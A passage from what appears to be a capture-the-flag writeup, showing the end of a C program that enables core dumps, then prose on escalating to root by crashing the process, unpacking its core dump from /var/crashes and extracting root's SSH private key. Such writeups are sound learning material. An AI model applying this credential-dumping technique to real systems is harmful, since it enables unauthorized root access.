</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// drop privs to limit file write
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    setuid(getuid());
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Enable coredump generation
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    prctl(PR_SET_DUMPABLE, <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    printf(<span style=color:#e6db74>&#34;Save results a file? [y/N]: &#34;</span>);
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> getchar();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (res <span style=color:#f92672>==</span> <span style=color:#ae81ff>121</span> <span style=color:#f92672>||</span> res <span style=color:#f92672>==</span> <span style=color:#ae81ff>89</span>) {
</span></span><span style=display:flex><span>        printf(<span style=color:#e6db74>&#34;Path: &#34;</span>);
</span></span><span style=display:flex><span>        scanf(<span style=color:#e6db74>&#34;%99s&#34;</span>, path);
</span></span><span style=display:flex><span>        FILE <span style=color:#f92672>*</span>fp <span style=color:#f92672>=</span> fopen(path, <span style=color:#e6db74>&#34;a&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (fp <span style=color:#f92672>!=</span> NULL) {
</span></span><span style=display:flex><span>            fputs(summary, fp);
</span></span><span style=display:flex><span>            fclose(fp);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>With this knowledge, the attacker can read directories and files they do not have permission to. Viewing the root directory shows a ssh folder meaning there may be possibility of dumping root&rsquo;s ssh private key.</p><h3 id=core-dump>Core Dump<a hidden class=anchor aria-hidden=true href=#core-dump>#</a></h3><p>After using the program&rsquo;s directory and file search, root&rsquo;s ssh private key can be discovered in /root/ssh/id_rsa. To dump the file, bring the process to the background with ctrl+z after the program requests for the user to save the results. Active processes can be viewed by using the &ldquo;ps&rdquo; command. Match the Process ID associated with program and kill the process and bring the program back to the foreground to crash the program. Once the program is killed, the core dump files can be located at /var/crashes. Using apport-unpack, the core dump can be made easier to read. From there the dump can be run through strings in order to find the private key. Once the key is retrieved, the attacker can ssh into root using the -i to allocate the private key.</p></div><footer class=post-footer></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://kkso.github.io/>kkso's Writeups</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script></body></html>